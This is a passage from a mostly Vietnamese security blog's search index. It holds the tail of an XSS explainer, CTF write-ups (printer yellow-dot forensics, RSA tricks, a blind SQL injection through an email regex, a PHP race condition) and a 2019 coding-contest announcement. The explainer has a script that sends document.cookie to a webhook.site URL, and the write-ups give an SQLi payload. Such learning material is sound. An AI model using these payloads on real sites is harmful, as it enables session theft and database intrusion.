hỗ trợ để gửi request về server của hacker kèm dữ liệu nhạy cảm, ví dụ 1 case đơn giản:var request = new XMLHttpRequest(); request.open(&#39;GET&#39;, &#39;https://webhook.site/f6d7fb91-a0b3-4604-b1b2-853553ddd8a9/?a=&#39;+document.cookie, true); request.send();Bypass CSRF: hacker có thể lợi dụng các thẻ như iframe để render trang được gán CSRF token để chống tấn công CSRF. Sau đó các dựa vào script XSS, hacker có thể đánh cắp token.Ngoài ra còn rất nhiều kịch bản khác!Ngăn chặn XSSData ValidationGiới hạn input của người dùng trong danh sách cụ thể, phương pháp này đảm bảo rằng chỉ các giá trị đã biết và an toàn mới được gửi đến máy chủ. Việc hạn chế input chỉ hoạt động nếu hệ thống biết có thể nhận được loại dữ liệu nào. Sử dụng thư viện có sẵn, vì các thư viện đó đã được nhiều developer sử dụng và thử nghiệm. Tuy nhiên, nó chỉ giúp giảm thiểu rủi ro, không đảm bảo đủ để ngăn chặn lỗ hổng XSS có thể xảy raEncode và xử lý dữ liệu đầu ra, kiểm tra nội dung không an toàn trước khi export hiển thị trên trình duyệt người dùng.Sử dụng WAFSử dụng tường lửa để bảo vệ ứng dụng, hệ thống trước các cuộc tấn công. Phương pháp này chặn các cuộc tấn công như XSS, RCE hoặc SQLi trước khi các yêu cầu độc hại đến được hệ thống. Nó cũng có lợi ích là bảo vệ chống lại các cuộc tấn công quy mô lớn như DDOS.Cấu hình CORSCấu hình Cross-Origin Resource Sharing giúp ngăn các website khác đánh cắp traffic của ứng dụng, ví dụ như khi attacker nhúng script vào các websites để gửi các thông tin đánh cắp được về máy chủ khác.Cấu hình CSPChỉ định các tên miền để trình duyệt xem là nguồn hợp lệ của các script thực thi. Trình duyệt tương thích CSP sau đó sẽ chỉ thực thi các script được load trong nguồn nhận được từ các miền thuộc danh sách đó." }, { "title": "FPTU SecAthon 2020 | Forensics Writeup | FRS301", "url": "/posts/FuSec3-Forensics/", "categories": "CTF, Forensics Challenges", "tags": "writeups, forensics, fusec20", "date": "2020-10-21 16:35:00 +0700", "snippet": "FRS301DescriptionDownload file: linkMachine Identification CodeSolutionBrief Convert the pdf files into images using pdftoppm Use deda to extract informations from images Grep serial number then extract data from thatDetails convert pdf to images$ pdftoppm -png yellow_dot.pdf output deda_parse_print to extract information from yellow dot 1 file output example: $ deda_parse_print yellow_dot-1.pngDetected pattern 4_|0|1|2|3|4|5|6|70|1|.2|.3|. . . . .4| . . .5| . . .6|.7|.8|. . .9| . . .0| . . .1| . . .2|. . .3|.4| . . .5| . . . 37 dots.&amp;lt;TDM of Pattern 4 at 0.00 x -0.00 inches&amp;gt;Decoded: manufacturer: Epson serial: -775267- timestamp: 2018-11-11 11:11:00 raw: 0000775267000018111111030011 minutes: 11 hour: 11 day: 11 month: 11 year: 18 unknown1: 00 unknown3: 00 unknown4: 00 unknown5: 00 printer: 00775267 Final script:$ for file in `find . -name &quot;*.png&quot;`;do echo -n $(deda_parse_print $file | grep serial | grep -Eo [0-9]{6}) | sed &#39;s/\\(..\\)/\\1 /g&#39; | awk &#39;{printf &quot;%c%c%c&quot;,$1,$2,$3}&#39;;done" }, { "title": "FPTU SecAthon 2020 | Cryptographic Writeup | CRY301 &amp; CRY302", "url": "/posts/FuSec3-CRY301-CRY302/", "categories": "CTF, Cryptographic Challenges", "tags": "writeups, cryptographic, fusec20", "date": "2020-10-21 15:34:00 +0700", "snippet": " This is an annual competition for FPT University students to practice their skills with jeopardy CTF challenges. I was with my team, M1sh13f, and we’re at the #5 place. Congrats me and my amazing teammates!!!!No more beating around the bush, here are my write-ups for the first two cryptography challenges.CRY301When netcat to the server, I can easily see that this cryptography challenge is about RSA encryption and decryption with the presence of public key n, e and also the private key d.But clearly, the server doesn’t tell anything about the ciphertext to decrypt or the message to encrypt. So, I take a look at the given zip file, containing two files: quotes.py and server.py.The quotes.py file contains a list of possible messages that the server will send you if you don’t come up with the right flag. So, I don’t spend any minute on the quotes.py but the other file server.py.MAGIK_STRING = b&quot;Aww, c&#39;mon, what&#39;s the worst that could happen?&quot;def handle(self): self.request.sendall(banner()) n, d, e = gen_key_pair() self.request.sendall(b&#39; n = %d&#39; % (n) + b&#39;\\n&#39;) self.request.sendall(b&#39; e = %d&#39; % (e) + b&#39;\\n&#39;) self.request.sendall(b&#39; d = %d&#39; % (d) + b&#39;\\n&#39;) self.request.sendall( b&#39;\\n Now if you say the magik number correctly, I\\&#39;ll give you a magik string as a reward\\n&#39;) self.request.sendall(b&#39; Enter your number here: &#39;) try: magik_number = int(self.rfile.readline().decode()) except ValueError: self.request.sendall(b&#39;\\n &#39; + random_quotes() + b&#39;\\n&#39;) return if magik_number == pow(bytes_to_long(MAGIK_STRING), e, n): self.request.sendall(b&#39;\\n &#39; + random_quotes() + b&#39;\\n&#39;) return if not pow(magik_number, d, n) == bytes_to_long(MAGIK_STRING): self.request.sendall(b&#39;\\n &#39; + random_quotes() + b&#39;\\n&#39;) return self.request.sendall(b&#39;\\n &#39; + rewards() + b&#39;\\n&#39;)So, the message to encrypt here is the given MAGIK_STRING. And you need to find the ciphertext. It’s easy enough as the server already gave out the key. But you can see that the server won’t accept the value of c = pow(message, e, n).The solution here is to find the number c’ that c and c’ are congruent modulo n. Simply enough, you just need to add c with n. $c’ = c + n$Send c’ to the server and here is the flag: FUSEC{Rul3s_4r3_m4d3_t0_b3_br0k3n_lik3_buildingz_0r_p30pl3_1602068882}CRY302This challenge is an upgraded version of the CRY301 problem you have seen above. netcat to the server will ask us to input the magik number.Check out the given source code, it tells us something about the prefix of the magik number.MAGIK_STRING = b&quot;I cannot be good. I must be perfection.&quot;SUFFIX = b&quot;You lack imagination.&quot;def handle(self): self.request.sendall(banner()) n, d, e = gen_key_pair() self.request.sendall(b&#39; n = %d&#39; % (n) + b&#39;\\n&#39;) self.request.sendall(b&#39; e = %d&#39; % (e) + b&#39;\\n&#39;) self.request.sendall(b&#39; d = %d&#39; % (d) + b&#39;\\n&#39;) self.request.sendall( b&#39;\\n Now if you say the magik number correctly, I\\&#39;ll give you a magik string as a reward\\n&#39;) self.request.sendall(b&#39; Enter your number here: &#39;) try: magik_number = int(self.rfile.readline().decode()) except ValueError: print(&#39;Not a number&#39;) self.request.sendall(b&#39;\\n &#39; + random_quotes() + b&#39;\\n&#39;) return if magik_number == pow(bytes_to_long(MAGIK_STRING), e, n): print(&#39;Sent c&#39;) self.request.sendall(b&#39;\\n &#39; + random_quotes() + b&#39;\\n&#39;) return if not long_to_bytes(magik_number).endswith(SUFFIX): print(&#39;Not end with suffix&#39;) self.request.sendall(b&#39;\\n &#39; + random_quotes() + b&#39;\\n&#39;) return if not pow(magik_number, d, n) == bytes_to_long(MAGIK_STRING): print(&#39;Decrypt does not return magik&#39;) self.request.sendall(b&#39;\\n &#39; + random_quotes() + b&#39;\\n&#39;) return self.request.sendall(b&#39;\\n &#39; + rewards() + b&#39;\\n&#39;)This challenge gives us more condition for the valid magik number. Similar to the first problem, we will need to find the number c’ that c and c’ are congruent modulo n. Also, c’ must end with the given SUFFIX.The first hint gave me the idea of crafting an equation. As c’ and c are congruent modulo n, $c’ = c + x * n$. So, I have one side of an equation with an unknown x.The other side of the equation will present the condition of ending with SUFFIX. The second hint is about how the bytes_to_long() and long_to_bytes() function work.The ultimate last hint is about how the endswith() method can be presented into the equationSo, here is the other side of the equation c’ = k * 16 ** len(hexlify(SUFFIX)) + bytes_to_long(SUFFIX) with the unknown k. You can calculate the length of SUFFIX and the value of bytes_to_long(SUFFIX). And the complete equation with c = pow(magik_String, e, n): $c + x * n = k * 16 ^ {42} + 130709955709673130759780524244946733922755218992686$The next step is to solve this equation and find one value of x and k. The Sage Cell Server, an online version of Sagemath, can help.Replace the c and n value, and here is the output:The unknowns x and k are described through the new t_0 variable.Now I only need the x value, so I will choose a random value for t_0 to find x. The simplest case is t_0 = 0, and I have the value of x. Then calculate $c’ = c + x * n$.Submit c’ to the server and here is our flag: FUSEC{In_c4rn4g3_I_bl00m_lik3_4_fl0w3r_in_th3_d4wn_1602085220}I will update the write-up for the final challenge of this competition as soon as possible. Thank you for reading.Keeping on CTF :))) !!!!Jessie" }, { "title": "FPTU SecAthon 2020 | Web Writeup | IAW301 &amp; IAW302", "url": "/posts/FuSec3-IAW301-IAW302/", "categories": "CTF, Web Challenges", "tags": "writeups, web, fusec20", "date": "2020-10-20 23:36:00 +0700", "snippet": "IAW301 HINT 2 : http://35.198.195.87:7001/src.zip HINT 4 : “valid/email*“@gmail.com SOLUTIONDựa vào hint 2 ta đọc source và biết ngay vuln tại phần email trong chức năng registration.$regexEmail = array(&quot;options&quot; =&amp;gt; array(&quot;regexp&quot;=&amp;gt;&quot;/^(?!(?:(?:\\\\\\\\x22?\\\\\\\\x5C[\\\\\\\\x00-\\\\\\\\x7E]\\\\\\\\x22?)|(?:\\\\\\\\x22?[^\\\\\\\\x5C\\\\\\\\x22]\\\\\\\\x22?)){255,})(?!(?:(?:\\\\\\\\x22?\\\\\\\\x5C[\\\\\\\\x00-\\\\\\\\x7E]\\\\\\\\x22?)|(?:\\\\\\\\x22?[^\\\\\\\\x5C\\\\\\\\x22]\\\\\\\\x22?)){240,}@)(?:(?:[\\\\\\\\x21\\\\\\\\x23-\\\\\\\\x27\\\\\\\\x2A\\\\\\\\x2B\\\\\\\\x2D\\\\\\\\x2F-\\\\\\\\x39\\\\\\\\x3D\\\\\\\\x3F\\\\\\\\x5E-\\\\\\\\x7E]+)|(?:\\\\\\\\x22(?:[\\\\\\\\x01-\\\\\\\\x08\\\\\\\\x0B\\\\\\\\x0C\\\\\\\\x0E-\\\\\\\\x1F\\\\\\\\x21\\\\\\\\x23-\\\\\\\\x5B\\\\\\\\x5D-\\\\\\\\x7F]|(?:\\\\\\\\x5C[\\\\\\\\x00-\\\\\\\\x7F]))*\\\\\\\\x22))(?:\\\\\\\\.(?:(?:[\\\\\\\\x21\\\\\\\\x23-\\\\\\\\x27\\\\\\\\x2A\\\\\\\\x2B\\\\\\\\x2D\\\\\\\\x2F-\\\\\\\\x39\\\\\\\\x3D\\\\\\\\x3F\\\\\\\\x5E-\\\\\\\\x7E]+)|(?:\\\\\\\\x22(?:[\\\\\\\\x01-\\\\\\\\x08\\\\\\\\x0B\\\\\\\\x0C\\\\\\\\x0E-\\\\\\\\x1F\\\\\\\\x21\\\\\\\\x23-\\\\\\\\x5B\\\\\\\\x5D-\\\\\\\\x7F]|(?:\\\\\\\\x5C[\\\\\\\\x00-\\\\\\\\x7F]))*\\\\\\\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\\\\\\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\\\\\\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\\\\\\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\\\\\\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\\\\\\\]))$/iD&quot;,&quot;default&quot;=&amp;gt;false)); if (filter_var($username, FILTER_VALIDATE_REGEXP, $regexUsername)){ if (filter_var($email, FILTER_VALIDATE_REGEXP, $regexEmail)){.............}}Và dưới đây là câu query signup bị vuln:$sql = &#39;INSERT INTO Users (username, email, password) VALUES (&quot;&#39;.$username.&#39;&quot;, &quot;&#39;.$email.&#39;&quot;, &quot;&#39;.md5($password).&#39;&quot;)&#39;; Để inject và lấy dữ liệu trong database được, chúng ta cần bypass cái regex ở trên, bằng một số kĩ thuật fuzzing và documentPAYLOAD#payload bind-sqli username=a&amp;amp;password=b&amp;amp;email=&quot;||(ascii(substr((select &#39;aa&#39;),1,1))&amp;gt;53)||&quot;@aaaaaagmail.com⇒ Flag: FUSEC{Fuzzing_Email_For_SQLi}IAW302Source code:&amp;lt;?php session_start(); @include &#39;/flag.php&#39;; if(!isset($_GET[&#39;choose&#39;])){ highlight_file(&quot;result.php&quot;); die(); } $name = md5(date(&quot;ms&quot;).md5($_GET[&#39;choose&#39;]).@$_COOKIE[&#39;PHPSESSID&#39;]); session_destroy(); $log_file = &quot;./&quot;.$name.&quot;.txt&quot;; echo &quot;Log: $log_file&amp;lt;/br&amp;gt;&quot;; file_put_contents($log_file,$_GET[&#39;choose&#39;]); if(@unlink($log_file)){ die(&quot;Loser&quot;); } echo @$flag;?&amp;gt;SOLUTIONSau khi test sơ qua mình đã thấy được code mà author cung cấp ở http://35.198.195.87:7002/result.php. Đây cũng là 1 dạng được khá nhiều người biết đến, dùng kĩ thuật race condition để khai thác. Và bây giờ mình sẽ phân tích, tại sao lại có thể exploit bằng race-con. Đầu tiên giá trị của $name được gán bằng md5-encode của date, get parameter và session, tiếp theo đó $name được lấy làm tên file txt và được nạp nội dung vào, sau đó kiểm tra xóa file thông qua đoạn if(@unlink($log_file)), nếu false thì echo flag, và ngược lại thì die(&quot;Loser&quot;). Nhìn thì có vẻ như không có bất kì vuln nào, nhưng các bạn hãy chú ý vào đoạn session_destroy(); được đặt giữa source code và nó có chức năng hủy session. Điều này rất nguy hiểm, vì nếu session bị hủy giữa chừng và đồng thời có nhiều request được gửi tới thì sẽ gây ra tình trạng mất dữ liệu bất ngờ, trong trường hợp trên thì sẽ mất dữ liệu của $name Do đó để unlink trả về false thì chỉ cần làm cho $name bị mất dữ liệu thì sẽ không tồn tại tên file , bằng cách dùng race condition để tạo ra nhiều request đồng thời: “Warning Immediate session deletion may cause unwanted results. When there is concurrent requests, other connections may see sudden session data loss. e.g. Requests from JavaScript and/or requests from URL links. Although current session module does not accept empty session ID cookie, but immediate session deletion may result in empty session ID cookie due to client(browser) side race condition. This will result that the client creates many session ID needlessly. To avoid these, you must set deletion time-stamp to $_SESSION and reject access while later. Or make sure your application does not have concurrent requests. This applies to session_regenerate_id() also.” - From PHP Main PagePAYLOAD Chỉ cần dùng thread để spam là okie !⇒ Flag: FUSEC{Hua_voi_moi_nguoi_lan_nay_lan_cuoi_dao_de}" }, { "title": "Code Battle 2019", "url": "/posts/Code-Battle-2019/", "categories": "Wiki, Event", "tags": "wiki, event, code", "date": "2019-05-15 10:54:00 +0700", "snippet": "💢💢💢Chặng đường CodeBattle2019 đã chính thức khép lại. 💢💢💢📍📍Ngày 05/05, tại trường đại học FPT, khu Công nghệ cao Hòa Lạc, cuộc chiến CodeBattle 2019 đã diễn ra trong không khí quyết liệt suốt 6 giờ đồng hồ giữa các đội thi từ các câu lạc bộ tin học tham gia dự thi. Chức vô địch cùng những giải thưởng giá trị của chương trình đã được trao về tay những đội xứng đáng.️🎊️🎊️🎊Chúc mừng tất cả các đội thi đã nỗ lực hoàn thành bài thi của mình và sau đây là các đội đã vươn lên dẫn đầu của cuộc thi:🥇EndGame (JS-FPT) - Giải nhất🥈Kurisutina (Đại học Công Nghệ - ĐHQGHN) - Giải nhì🥉ITPTIT_Bé xin cái giải - Giải ba️🏅PROPTIT_Ám Nhiên Tiêu Hồn Chưởng - Nhất nội dung AI🏅rm -r /brain/* (JS-FPT) - Nhất nội dung ACM🏅ITPTIT_CodeBattle_Injection - Nhất nội dung CTF(Tất cả giải thưởng các giải sẽ được gửi cho đại diện các CLB trong tuần này)🍀Dù ai là người chiến thắng có lẽ cũng không ý nghĩa bằng thời gian chúng ta đã có tại FPTU. Chắc hẳn các đội chơi vẫn còn những cảm xúc đáng nhớ tại ngôi trường đẹp như mơ này cùng những người bạn dễ mến đến từ các câu lạc bộ. Những giây phút căng thẳng lúc cuối giờ thi, những hình ảnh của các bạn trong ban tổ chức. Tất cả đã trở thành dấu ấn khó phai mờ của Code Battle 2019 trong kí ức các đội dự thi.❤️🌺Code Battle năm nay đã đến hồi khép lại, đánh dấu sự hợp tác tổ chức giữa năm câu lạc bộ PROPTIT, ITPTIT, TLIT, JS FPT &amp;amp; HAMIC trong hiện tại và trong tương lai. Sự đoàn kết này hứa hẹn năm sau chương trình sẽ trở lại và lợi hại hơn gấp nhiều lần. Các bạn hãy cùng theo dõi và chờ đợi CodeBattle 2020 nhé.❤️️🎈️🎈Lời cuối cùng, Ban tổ chức xin cảm ơn:👉Toàn thể các bạn thí sinh đã đến tham dự cuộc thi!👉Các bạn trong ban tổ chức đã nỗ lực không ngừng nghỉ để chương trình được diễn ra thành công!👉Cảm ơn trường đại học FPT đã hỗ trợ cơ sở hạ tầng rất tốt.👉 Đặc biệt BTC cũng xin trân thành cảm ơn các nhà tài trợ đã đồng hành cùng CodeBattle2019 Đơn vị bảo trợ: Đoàn thanh niên Học viện Công nghệ Bưu chính Viễn thông Đơn vị hỗ trợ: Phòng hợp tác quốc tế và phát triển cá nhân IC-PDP Các nhà tài trợ Bạc: Công ty cổ phần đầu tư và giải pháp VietIS Tổng công ty Viễn thông Viettel - Chi nhánh tập đoàn Công nghiệp - Viễn thông Quân đội Công ty TNHH Alt Plus Việt Nam " } ]
